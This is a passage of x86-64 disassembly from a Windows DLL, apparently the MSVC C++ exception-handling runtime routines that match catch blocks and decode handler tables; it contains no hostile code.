   1800047c5:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800047ca:	48 83 c4 20          	add    $0x20,%rsp
   1800047ce:	41 5e                	pop    %r14
   1800047d0:	c3                   	ret
   1800047d1:	cc                   	int3
   1800047d2:	cc                   	int3
   1800047d3:	cc                   	int3
   1800047d4:	48 8b c4             	mov    %rsp,%rax
   1800047d7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800047db:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1800047df:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800047e3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800047e7:	41 56                	push   %r14
   1800047e9:	48 83 ec 20          	sub    $0x20,%rsp
   1800047ed:	33 db                	xor    %ebx,%ebx
   1800047ef:	4d 8b f0             	mov    %r8,%r14
   1800047f2:	48 8b ea             	mov    %rdx,%rbp
   1800047f5:	48 8b f9             	mov    %rcx,%rdi
   1800047f8:	39 59 08             	cmp    %ebx,0x8(%rcx)
   1800047fb:	0f 84 f5 00 00 00    	je     0x1800048f6
   180004801:	48 63 71 08          	movslq 0x8(%rcx),%rsi
   180004805:	e8 16 e8 ff ff       	call   0x180003020
   18000480a:	4c 8b c8             	mov    %rax,%r9
   18000480d:	4c 03 ce             	add    %rsi,%r9
   180004810:	0f 84 e0 00 00 00    	je     0x1800048f6
   180004816:	85 f6                	test   %esi,%esi
   180004818:	74 0f                	je     0x180004829
   18000481a:	48 63 77 08          	movslq 0x8(%rdi),%rsi
   18000481e:	e8 fd e7 ff ff       	call   0x180003020
   180004823:	48 8d 0c 06          	lea    (%rsi,%rax,1),%rcx
   180004827:	eb 05                	jmp    0x18000482e
   180004829:	48 8b cb             	mov    %rbx,%rcx
   18000482c:	8b f3                	mov    %ebx,%esi
   18000482e:	38 59 10             	cmp    %bl,0x10(%rcx)
   180004831:	0f 84 bf 00 00 00    	je     0x1800048f6
   180004837:	f6 47 04 80          	testb  $0x80,0x4(%rdi)
   18000483b:	74 0a                	je     0x180004847
   18000483d:	f6 45 00 10          	testb  $0x10,0x0(%rbp)
   180004841:	0f 85 af 00 00 00    	jne    0x1800048f6
   180004847:	85 f6                	test   %esi,%esi
   180004849:	74 11                	je     0x18000485c
   18000484b:	e8 d0 e7 ff ff       	call   0x180003020
   180004850:	48 8b f0             	mov    %rax,%rsi
   180004853:	48 63 47 08          	movslq 0x8(%rdi),%rax
   180004857:	48 03 f0             	add    %rax,%rsi
   18000485a:	eb 03                	jmp    0x18000485f
   18000485c:	48 8b f3             	mov    %rbx,%rsi
   18000485f:	e8 d0 e7 ff ff       	call   0x180003034
   180004864:	48 8b c8             	mov    %rax,%rcx
   180004867:	48 63 45 04          	movslq 0x4(%rbp),%rax
   18000486b:	48 03 c8             	add    %rax,%rcx
   18000486e:	48 3b f1             	cmp    %rcx,%rsi
   180004871:	74 4b                	je     0x1800048be
   180004873:	39 5f 08             	cmp    %ebx,0x8(%rdi)
   180004876:	74 11                	je     0x180004889
   180004878:	e8 a3 e7 ff ff       	call   0x180003020
   18000487d:	48 8b f0             	mov    %rax,%rsi
   180004880:	48 63 47 08          	movslq 0x8(%rdi),%rax
   180004884:	48 03 f0             	add    %rax,%rsi
   180004887:	eb 03                	jmp    0x18000488c
   180004889:	48 8b f3             	mov    %rbx,%rsi
   18000488c:	e8 a3 e7 ff ff       	call   0x180003034
   180004891:	4c 63 45 04          	movslq 0x4(%rbp),%r8
   180004895:	49 83 c0 10          	add    $0x10,%r8
   180004899:	4c 03 c0             	add    %rax,%r8
   18000489c:	48 8d 46 10          	lea    0x10(%rsi),%rax
   1800048a0:	4c 2b c0             	sub    %rax,%r8
   1800048a3:	0f b6 08             	movzbl (%rax),%ecx
   1800048a6:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   1800048ab:	2b ca                	sub    %edx,%ecx
   1800048ad:	75 07                	jne    0x1800048b6
   1800048af:	48 ff c0             	inc    %rax
   1800048b2:	85 d2                	test   %edx,%edx
   1800048b4:	75 ed                	jne    0x1800048a3
   1800048b6:	85 c9                	test   %ecx,%ecx
   1800048b8:	74 04                	je     0x1800048be
   1800048ba:	33 c0                	xor    %eax,%eax
   1800048bc:	eb 3d                	jmp    0x1800048fb
   1800048be:	b0 02                	mov    $0x2,%al
   1800048c0:	84 45 00             	test   %al,0x0(%rbp)
   1800048c3:	74 06                	je     0x1800048cb
   1800048c5:	f6 47 04 08          	testb  $0x8,0x4(%rdi)
   1800048c9:	74 27                	je     0x1800048f2
   1800048cb:	41 f6 06 01          	testb  $0x1,(%r14)
   1800048cf:	74 06                	je     0x1800048d7
   1800048d1:	f6 47 04 01          	testb  $0x1,0x4(%rdi)
   1800048d5:	74 1b                	je     0x1800048f2
   1800048d7:	41 f6 06 04          	testb  $0x4,(%r14)
   1800048db:	74 06                	je     0x1800048e3
   1800048dd:	f6 47 04 04          	testb  $0x4,0x4(%rdi)
   1800048e1:	74 0f                	je     0x1800048f2
   1800048e3:	41 84 06             	test   %al,(%r14)
   1800048e6:	74 05                	je     0x1800048ed
   1800048e8:	84 47 04             	test   %al,0x4(%rdi)
   1800048eb:	74 05                	je     0x1800048f2
   1800048ed:	bb 01 00 00 00       	mov    $0x1,%ebx
   1800048f2:	8b c3                	mov    %ebx,%eax
   1800048f4:	eb 05                	jmp    0x1800048fb
   1800048f6:	b8 01 00 00 00       	mov    $0x1,%eax
   1800048fb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004900:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180004905:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000490a:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000490f:	48 83 c4 20          	add    $0x20,%rsp
   180004913:	41 5e                	pop    %r14
   180004915:	c3                   	ret
   180004916:	cc                   	int3
   180004917:	cc                   	int3
   180004918:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000491d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180004922:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180004927:	57                   	push   %rdi
   180004928:	41 56                	push   %r14
   18000492a:	41 57                	push   %r15
   18000492c:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   180004933:	48 8b d9             	mov    %rcx,%rbx
   180004936:	49 8b e9             	mov    %r9,%rbp
   180004939:	49 8b c8             	mov    %r8,%rcx
   18000493c:	4d 8b f8             	mov    %r8,%r15
   18000493f:	4c 8b f2             	mov    %rdx,%r14
   180004942:	e8 0d 10 00 00       	call   0x180005954
   180004947:	e8 88 ef ff ff       	call   0x1800038d4
   18000494c:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   180004953:	00 
   180004954:	33 f6                	xor    %esi,%esi
   180004956:	41 b8 29 00 00 80    	mov    $0x80000029,%r8d
   18000495c:	41 b9 26 00 00 80    	mov    $0x80000026,%r9d
   180004962:	39 70 40             	cmp    %esi,0x40(%rax)
   180004965:	75 2b                	jne    0x180004992
   180004967:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   18000496d:	74 23                	je     0x180004992
   18000496f:	44 39 03             	cmp    %r8d,(%rbx)
   180004972:	75 10                	jne    0x180004984
   180004974:	83 7b 18 0f          	cmpl   $0xf,0x18(%rbx)
   180004978:	75 0f                	jne    0x180004989
   18000497a:	48 81 7b 60 20 05 93 	cmpq   $0x19930520,0x60(%rbx)
   180004981:	19 
   180004982:	74 0e                	je     0x180004992
   180004984:	44 39 0b             	cmp    %r9d,(%rbx)
   180004987:	74 09                	je     0x180004992
   180004989:	f6 07 20             	testb  $0x20,(%rdi)
   18000498c:	0f 85 f2 01 00 00    	jne    0x180004b84
   180004992:	f6 43 04 66          	testb  $0x66,0x4(%rbx)
   180004996:	0f 84 1a 01 00 00    	je     0x180004ab6
   18000499c:	39 77 08             	cmp    %esi,0x8(%rdi)
   18000499f:	0f 84 df 01 00 00    	je     0x180004b84
   1800049a5:	48 63 57 08          	movslq 0x8(%rdi),%rdx
   1800049a9:	4c 8d 3d 50 b6 ff ff 	lea    -0x49b0(%rip),%r15        # 0x180000000
   1800049b0:	48 03 55 08          	add    0x8(%rbp),%rdx
   1800049b4:	0f b6 0a             	movzbl (%rdx),%ecx
   1800049b7:	83 e1 0f             	and    $0xf,%ecx
   1800049ba:	4a 0f be 84 39 c0 03 	movsbq 0x103c0(%rcx,%r15,1),%rax
   1800049c1:	01 00 
   1800049c3:	42 8a 8c 39 d0 03 01 	mov    0x103d0(%rcx,%r15,1),%cl
   1800049ca:	00 
   1800049cb:	48 2b d0             	sub    %rax,%rdx
   1800049ce:	8b 42 fc             	mov    -0x4(%rdx),%eax
   1800049d1:	d3 e8                	shr    %cl,%eax
   1800049d3:	85 c0                	test   %eax,%eax
   1800049d5:	0f 84 a9 01 00 00    	je     0x180004b84
   1800049db:	39 b4 24 c8 00 00 00 	cmp    %esi,0xc8(%rsp)
   1800049e2:	0f 85 9c 01 00 00    	jne    0x180004b84
   1800049e8:	f6 43 04 20          	testb  $0x20,0x4(%rbx)
   1800049ec:	0f 84 b1 00 00 00    	je     0x180004aa3
   1800049f2:	44 39 0b             	cmp    %r9d,(%rbx)
   1800049f5:	75 63                	jne    0x180004a5a
   1800049f7:	4c 8b 45 20          	mov    0x20(%rbp),%r8
   1800049fb:	48 8b d5             	mov    %rbp,%rdx
   1800049fe:	48 8b cf             	mov    %rdi,%rcx
   180004a01:	e8 1e f0 ff ff       	call   0x180003a24
   180004a06:	44 8b c8             	mov    %eax,%r9d
   180004a09:	83 f8 ff             	cmp    $0xffffffff,%eax
   180004a0c:	0f 8c 94 01 00 00    	jl     0x180004ba6
   180004a12:	39 77 08             	cmp    %esi,0x8(%rdi)
   180004a15:	74 27                	je     0x180004a3e
   180004a17:	48 63 57 08          	movslq 0x8(%rdi),%rdx
   180004a1b:	48 03 55 08          	add    0x8(%rbp),%rdx
   180004a1f:	0f b6 0a             	movzbl (%rdx),%ecx
   180004a22:	83 e1 0f             	and    $0xf,%ecx
   180004a25:	4a 0f be 84 39 c0 03 	movsbq 0x103c0(%rcx,%r15,1),%rax
   180004a2c:	01 00 
   180004a2e:	42 8a 8c 39 d0 03 01 	mov    0x103d0(%rcx,%r15,1),%cl
   180004a35:	00 
   180004a36:	48 2b d0             	sub    %rax,%rdx
   180004a39:	8b 72 fc             	mov    -0x4(%rdx),%esi
   180004a3c:	d3 ee                	shr    %cl,%esi
   180004a3e:	44 3b ce             	cmp    %esi,%r9d
   180004a41:	0f 8d 5f 01 00 00    	jge    0x180004ba6
   180004a47:	49 8b ce             	mov    %r14,%rcx
   180004a4a:	48 8b d5             	mov    %rbp,%rdx
   180004a4d:	4c 8b c7             	mov    %rdi,%r8
   180004a50:	e8 97 07 00 00       	call   0x1800051ec
   180004a55:	e9 2a 01 00 00       	jmp    0x180004b84
   180004a5a:	44 39 03             	cmp    %r8d,(%rbx)
   180004a5d:	75 44                	jne    0x180004aa3
   180004a5f:	44 8b 4b 38          	mov    0x38(%rbx),%r9d
   180004a63:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   180004a67:	0f 8c 39 01 00 00    	jl     0x180004ba6
   180004a6d:	48 63 57 08          	movslq 0x8(%rdi),%rdx
   180004a71:	48 03 55 08          	add    0x8(%rbp),%rdx
   180004a75:	0f b6 0a             	movzbl (%rdx),%ecx
   180004a78:	83 e1 0f             	and    $0xf,%ecx
   180004a7b:	4a 0f be 84 39 c0 03 	movsbq 0x103c0(%rcx,%r15,1),%rax
   180004a82:	01 00 
   180004a84:	42 8a 8c 39 d0 03 01 	mov    0x103d0(%rcx,%r15,1),%cl
   180004a8b:	00 
   180004a8c:	48 2b d0             	sub    %rax,%rdx
   180004a8f:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180004a92:	d3 e8                	shr    %cl,%eax
   180004a94:	44 3b c8             	cmp    %eax,%r9d
   180004a97:	0f 8d 09 01 00 00    	jge    0x180004ba6
   180004a9d:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   180004aa1:	eb a7                	jmp    0x180004a4a
   180004aa3:	4c 8b c7             	mov    %rdi,%r8
   180004aa6:	48 8b d5             	mov    %rbp,%rdx
   180004aa9:	49 8b ce             	mov    %r14,%rcx
   180004aac:	e8 3f e0 ff ff       	call   0x180002af0
   180004ab1:	e9 ce 00 00 00       	jmp    0x180004b84
   180004ab6:	4c 8b 45 08          	mov    0x8(%rbp),%r8
   180004aba:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180004abf:	48 8b d7             	mov    %rdi,%rdx
   180004ac2:	e8 61 01 00 00       	call   0x180004c28
   180004ac7:	39 74 24 50          	cmp    %esi,0x50(%rsp)
   180004acb:	75 09                	jne    0x180004ad6
   180004acd:	f6 07 40             	testb  $0x40,(%rdi)
   180004ad0:	0f 84 ae 00 00 00    	je     0x180004b84
   180004ad6:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   180004adc:	75 6d                	jne    0x180004b4b
   180004ade:	83 7b 18 03          	cmpl   $0x3,0x18(%rbx)
   180004ae2:	72 67                	jb     0x180004b4b
   180004ae4:	81 7b 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rbx)
   180004aeb:	76 5e                	jbe    0x180004b4b
   180004aed:	48 8b 43 30          	mov    0x30(%rbx),%rax
   180004af1:	39 70 08             	cmp    %esi,0x8(%rax)
   180004af4:	74 55                	je     0x180004b4b
   180004af6:	e8 39 e5 ff ff       	call   0x180003034
   180004afb:	4c 8b d0             	mov    %rax,%r10
   180004afe:	48 8b 43 30          	mov    0x30(%rbx),%rax
   180004b02:	48 63 48 08          	movslq 0x8(%rax),%rcx
   180004b06:	4c 03 d1             	add    %rcx,%r10
   180004b09:	74 40                	je     0x180004b4b
   180004b0b:	0f b6 8c 24 d8 00 00 	movzbl 0xd8(%rsp),%ecx
   180004b12:	00 
   180004b13:	4c 8b cd             	mov    %rbp,%r9
   180004b16:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   180004b1a:	4d 8b c7             	mov    %r15,%r8
   180004b1d:	48 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%rcx
   180004b24:	00 
   180004b25:	49 8b d6             	mov    %r14,%rdx
   180004b28:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180004b2d:	49 8b c2             	mov    %r10,%rax
   180004b30:	8b 8c 24 c8 00 00 00 	mov    0xc8(%rsp),%ecx
   180004b37:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   180004b3b:	48 8b cb             	mov    %rbx,%rcx
   180004b3e:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004b43:	ff 15 1f b7 00 00    	call   *0xb71f(%rip)        # 0x180010268
   180004b49:	eb 3e                	jmp    0x180004b89
   180004b4b:	48 8b 84 24 d0 00 00 	mov    0xd0(%rsp),%rax
   180004b52:	00 
   180004b53:	4c 8b cd             	mov    %rbp,%r9
   180004b56:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180004b5b:	4d 8b c7             	mov    %r15,%r8
   180004b5e:	8b 84 24 c8 00 00 00 	mov    0xc8(%rsp),%eax
   180004b65:	49 8b d6             	mov    %r14,%rdx
   180004b68:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180004b6c:	48 8b cb             	mov    %rbx,%rcx
   180004b6f:	8a 84 24 d8 00 00 00 	mov    0xd8(%rsp),%al
   180004b76:	88 44 24 28          	mov    %al,0x28(%rsp)
   180004b7a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004b7f:	e8 24 f3 ff ff       	call   0x180003ea8
   180004b84:	b8 01 00 00 00       	mov    $0x1,%eax
   180004b89:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   180004b90:	00 
   180004b91:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180004b95:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   180004b99:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180004b9d:	49 8b e3             	mov    %r11,%rsp
   180004ba0:	41 5f                	pop    %r15
   180004ba2:	41 5e                	pop    %r14
   180004ba4:	5f                   	pop    %rdi
   180004ba5:	c3                   	ret
   180004ba6:	e8 29 2c 00 00       	call   0x1800077d4
   180004bab:	cc                   	int3
   180004bac:	40 53                	rex push %rbx
   180004bae:	48 83 ec 20          	sub    $0x20,%rsp
   180004bb2:	33 c0                	xor    %eax,%eax
   180004bb4:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004bb7:	88 41 18             	mov    %al,0x18(%rcx)
   180004bba:	48 8b d9             	mov    %rcx,%rbx
   180004bbd:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   180004bc1:	48 89 41 24          	mov    %rax,0x24(%rcx)
   180004bc5:	0f 11 41 30          	movups %xmm0,0x30(%rcx)
   180004bc9:	4c 89 41 40          	mov    %r8,0x40(%rcx)
   180004bcd:	44 89 49 48          	mov    %r9d,0x48(%rcx)
   180004bd1:	39 42 0c             	cmp    %eax,0xc(%rdx)
   180004bd4:	74 45                	je     0x180004c1b
   180004bd6:	48 63 52 0c          	movslq 0xc(%rdx),%rdx
   180004bda:	49 03 d0             	add    %r8,%rdx
   180004bdd:	4c 8d 05 1c b4 ff ff 	lea    -0x4be4(%rip),%r8        # 0x180000000
   180004be4:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   180004be8:	0f b6 0a             	movzbl (%rdx),%ecx
   180004beb:	83 e1 0f             	and    $0xf,%ecx
   180004bee:	4a 0f be 84 01 c0 03 	movsbq 0x103c0(%rcx,%r8,1),%rax
   180004bf5:	01 00 
   180004bf7:	42 8a 8c 01 d0 03 01 	mov    0x103d0(%rcx,%r8,1),%cl
   180004bfe:	00 
   180004bff:	48 2b d0             	sub    %rax,%rdx
   180004c02:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180004c05:	d3 e8                	shr    %cl,%eax
   180004c07:	48 8b cb             	mov    %rbx,%rcx
   180004c0a:	48 89 53 08          	mov    %rdx,0x8(%rbx)
   180004c0e:	89 03                	mov    %eax,(%rbx)
   180004c10:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   180004c14:	e8 93 03 00 00       	call   0x180004fac
   180004c19:	eb 02                	jmp    0x180004c1d
   180004c1b:	89 01                	mov    %eax,(%rcx)
   180004c1d:	48 8b c3             	mov    %rbx,%rax
   180004c20:	48 83 c4 20          	add    $0x20,%rsp
   180004c24:	5b                   	pop    %rbx
   180004c25:	c3                   	ret
   180004c26:	cc                   	int3
   180004c27:	cc                   	int3
   180004c28:	83 7a 0c 00          	cmpl   $0x0,0xc(%rdx)
   180004c2c:	4c 8b c9             	mov    %rcx,%r9
   180004c2f:	0f 84 c1 00 00 00    	je     0x180004cf6
   180004c35:	48 63 52 0c          	movslq 0xc(%rdx),%rdx
   180004c39:	49 03 d0             	add    %r8,%rdx
   180004c3c:	4c 8d 05 bd b3 ff ff 	lea    -0x4c43(%rip),%r8        # 0x180000000
   180004c43:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   180004c47:	0f b6 0a             	movzbl (%rdx),%ecx
   180004c4a:	83 e1 0f             	and    $0xf,%ecx
   180004c4d:	4a 0f be 84 01 c0 03 	movsbq 0x103c0(%rcx,%r8,1),%rax
   180004c54:	01 00 
   180004c56:	42 8a 8c 01 d0 03 01 	mov    0x103d0(%rcx,%r8,1),%cl
   180004c5d:	00 
   180004c5e:	48 2b d0             	sub    %rax,%rdx
   180004c61:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180004c64:	d3 e8                	shr    %cl,%eax
   180004c66:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180004c6a:	41 89 01             	mov    %eax,(%r9)
   180004c6d:	49 89 51 10          	mov    %rdx,0x10(%r9)
   180004c71:	0f b6 0a             	movzbl (%rdx),%ecx
   180004c74:	83 e1 0f             	and    $0xf,%ecx
   180004c77:	4a 0f be 84 01 c0 03 	movsbq 0x103c0(%rcx,%r8,1),%rax
   180004c7e:	01 00 
   180004c80:	42 8a 8c 01 d0 03 01 	mov    0x103d0(%rcx,%r8,1),%cl
   180004c87:	00 
   180004c88:	48 2b d0             	sub    %rax,%rdx
   180004c8b:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180004c8e:	d3 e8                	shr    %cl,%eax
   180004c90:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180004c94:	41 89 41 18          	mov    %eax,0x18(%r9)
   180004c98:	0f b6 0a             	movzbl (%rdx),%ecx
   180004c9b:	83 e1 0f             	and    $0xf,%ecx
   180004c9e:	4a 0f be 84 01 c0 03 	movsbq 0x103c0(%rcx,%r8,1),%rax
   180004ca5:	01 00 
   180004ca7:	42 8a 8c 01 d0 03 01 	mov    0x103d0(%rcx,%r8,1),%cl
   180004cae:	00 
   180004caf:	48 2b d0             	sub    %rax,%rdx
   180004cb2:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180004cb5:	d3 e8                	shr    %cl,%eax
   180004cb7:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180004cbb:	41 89 41 1c          	mov    %eax,0x1c(%r9)
   180004cbf:	0f b6 0a             	movzbl (%rdx),%ecx
   180004cc2:	83 e1 0f             	and    $0xf,%ecx
   180004cc5:	4a 0f be 84 01 c0 03 	movsbq 0x103c0(%rcx,%r8,1),%rax
   180004ccc:	01 00 
   180004cce:	42 8a 8c 01 d0 03 01 	mov    0x103d0(%rcx,%r8,1),%cl
   180004cd5:	00 
   180004cd6:	48 2b d0             	sub    %rax,%rdx
   180004cd9:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180004cdc:	d3 e8                	shr    %cl,%eax
   180004cde:	41 89 41 20          	mov    %eax,0x20(%r9)
   180004ce2:	48 8d 42 04          	lea    0x4(%rdx),%rax
   180004ce6:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180004cea:	8b 0a                	mov    (%rdx),%ecx
   180004cec:	49 89 41 08          	mov    %rax,0x8(%r9)
   180004cf0:	41 89 49 24          	mov    %ecx,0x24(%r9)
   180004cf4:	eb 03                	jmp    0x180004cf9
   180004cf6:	83 21 00             	andl   $0x0,(%rcx)
   180004cf9:	49 8b c1             	mov    %r9,%rax
   180004cfc:	c3                   	ret
   180004cfd:	cc                   	int3
   180004cfe:	cc                   	int3
   180004cff:	cc                   	int3
   180004d00:	40 53                	rex push %rbx
   180004d02:	48 83 ec 20          	sub    $0x20,%rsp
   180004d06:	48 8b d9             	mov    %rcx,%rbx
   180004d09:	48 8b c2             	mov    %rdx,%rax
   180004d0c:	48 8d 0d f5 b5 00 00 	lea    0xb5f5(%rip),%rcx        # 0x180010308
   180004d13:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004d16:	48 89 0b             	mov    %rcx,(%rbx)
   180004d19:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180004d1d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180004d21:	0f 11 02             	movups %xmm0,(%rdx)
   180004d24:	e8 3f e5 ff ff       	call   0x180003268
   180004d29:	48 8d 05 58 b7 00 00 	lea    0xb758(%rip),%rax        # 0x180010488
   180004d30:	48 89 03             	mov    %rax,(%rbx)
   180004d33:	48 8b c3             	mov    %rbx,%rax
   180004d36:	48 83 c4 20          	add    $0x20,%rsp
   180004d3a:	5b                   	pop    %rbx
   180004d3b:	c3                   	ret
   180004d3c:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   180004d41:	48 8d 05 50 b7 00 00 	lea    0xb750(%rip),%rax        # 0x180010498
   180004d48:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180004d4c:	48 8d 05 35 b7 00 00 	lea    0xb735(%rip),%rax        # 0x180010488
   180004d53:	48 89 01             	mov    %rax,(%rcx)
   180004d56:	48 8b c1             	mov    %rcx,%rax
   180004d59:	c3                   	ret
   180004d5a:	cc                   	int3
   180004d5b:	cc                   	int3
   180004d5c:	48 8b c4             	mov    %rsp,%rax
   180004d5f:	53                   	push   %rbx
   180004d60:	56                   	push   %rsi
   180004d61:	57                   	push   %rdi
   180004d62:	41 54                	push   %r12
   180004d64:	41 55                	push   %r13
   180004d66:	41 57                	push   %r15
   180004d68:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   180004d6f:	48 8b f9             	mov    %rcx,%rdi
   180004d72:	45 33 e4             	xor    %r12d,%r12d
   180004d75:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   180004d7a:	44 21 a4 24 f0 00 00 	and    %r12d,0xf0(%rsp)
   180004d81:	00 
   180004d82:	4c 21 64 24 28       	and    %r12,0x28(%rsp)
   180004d87:	4c 21 64 24 40       	and    %r12,0x40(%rsp)
   180004d8c:	44 88 60 80          	mov    %r12b,-0x80(%rax)
   180004d90:	44 21 60 84          	and    %r12d,-0x7c(%rax)
   180004d94:	44 21 60 88          	and    %r12d,-0x78(%rax)
   180004d98:	44 21 60 8c          	and    %r12d,-0x74(%rax)
   180004d9c:	44 21 60 90          	and    %r12d,-0x70(%rax)
   180004da0:	44 21 60 94          	and    %r12d,-0x6c(%rax)
   180004da4:	e8 2b eb ff ff       	call   0x1800038d4
   180004da9:	48 8b 40 28          	mov    0x28(%rax),%rax
   180004dad:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180004db2:	e8 1d eb ff ff       	call   0x1800038d4
   180004db7:	48 8b 40 20          	mov    0x20(%rax),%rax
   180004dbb:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180004dc0:	48 8b 77 50          	mov    0x50(%rdi),%rsi
   180004dc4:	48 89 b4 24 f8 00 00 	mov    %rsi,0xf8(%rsp)
   180004dcb:	00 
   180004dcc:	48 8b 5f 40          	mov    0x40(%rdi),%rbx
   180004dd0:	48 8b 47 30          	mov    0x30(%rdi),%rax
   180004dd4:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180004dd9:	4c 8b 7f 28          	mov    0x28(%rdi),%r15
   180004ddd:	48 8b 47 48          	mov    0x48(%rdi),%rax
   180004de1:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   180004de6:	48 8b 47 68          	mov    0x68(%rdi),%rax
   180004dea:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   180004def:	8b 47 78             	mov    0x78(%rdi),%eax
   180004df2:	89 84 24 e8 00 00 00 	mov    %eax,0xe8(%rsp)
   180004df9:	8b 47 38             	mov    0x38(%rdi),%eax
   180004dfc:	89 84 24 e0 00 00 00 	mov    %eax,0xe0(%rsp)
   180004e03:	48 8b cb             	mov    %rbx,%rcx
   180004e06:	e8 49 0b 00 00       	call   0x180005954
   180004e0b:	e8 c4 ea ff ff       	call   0x1800038d4
   180004e10:	48 89 70 20          	mov    %rsi,0x20(%rax)
   180004e14:	e8 bb ea ff ff       	call   0x1800038d4
   180004e19:	48 89 58 28          	mov    %rbx,0x28(%rax)
   180004e1d:	e8 b2 ea ff ff       	call   0x1800038d4
   180004e22:	48 8b 50 20          	mov    0x20(%rax),%rdx
   180004e26:	48 8b 52 28          	mov    0x28(%rdx),%rdx
   180004e2a:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   180004e31:	00 
   180004e32:	e8 59 e1 ff ff       	call   0x180002f90
   180004e37:	4c 8b e8             	mov    %rax,%r13
   180004e3a:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180004e3f:	4c 39 67 58          	cmp    %r12,0x58(%rdi)
   180004e43:	74 19                	je     0x180004e5e
   180004e45:	c7 84 24 f0 00 00 00 	movl   $0x1,0xf0(%rsp)
   180004e4c:	01 00 00 00 
   180004e50:	e8 7f ea ff ff       	call   0x1800038d4
   180004e55:	48 8b 48 70          	mov    0x70(%rax),%rcx
   180004e59:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180004e5e:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   180004e64:	49 8b d7             	mov    %r15,%rdx
   180004e67:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180004e6c:	e8 5f 0e 00 00       	call   0x180005cd0
   180004e71:	48 8b d8             	mov    %rax,%rbx
   180004e74:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004e79:	48 83 f8 02          	cmp    $0x2,%rax
   180004e7d:	7d 13                	jge    0x180004e92
   180004e7f:	48 8b 5c c4 70       	mov    0x70(%rsp,%rax,8),%rbx
   180004e84:	48 85 db             	test   %rbx,%rbx
   180004e87:	0f 84 18 01 00 00    	je     0x180004fa5
   180004e8d:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   180004e92:	49 8b d7             	mov    %r15,%rdx
   180004e95:	48 8b cb             	mov    %rbx,%rcx
   180004e98:	e8 63 0e 00 00       	call   0x180005d00
   180004e9d:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   180004ea2:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   180004ea7:	eb 7c                	jmp    0x180004f25
   180004ea9:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   180004eb0:	00 
   180004eb1:	e8 1e ea ff ff       	call   0x1800038d4
   180004eb6:	83 60 40 00          	andl   $0x0,0x40(%rax)
   180004eba:	e8 15 ea ff ff       	call   0x1800038d4
   180004ebf:	8b 8c 24 e8 00 00 00 	mov    0xe8(%rsp),%ecx
   180004ec6:	89 48 78             	mov    %ecx,0x78(%rax)
   180004ec9:	48 8b b4 24 f8 00 00 	mov    0xf8(%rsp),%rsi
   180004ed0:	00 
   180004ed1:	83 bc 24 f0 00 00 00 	cmpl   $0x0,0xf0(%rsp)
   180004ed8:	00 
   180004ed9:	74 1e                	je     0x180004ef9
   180004edb:	b2 01                	mov    $0x1,%dl
   180004edd:	48 8b ce             	mov    %rsi,%rcx
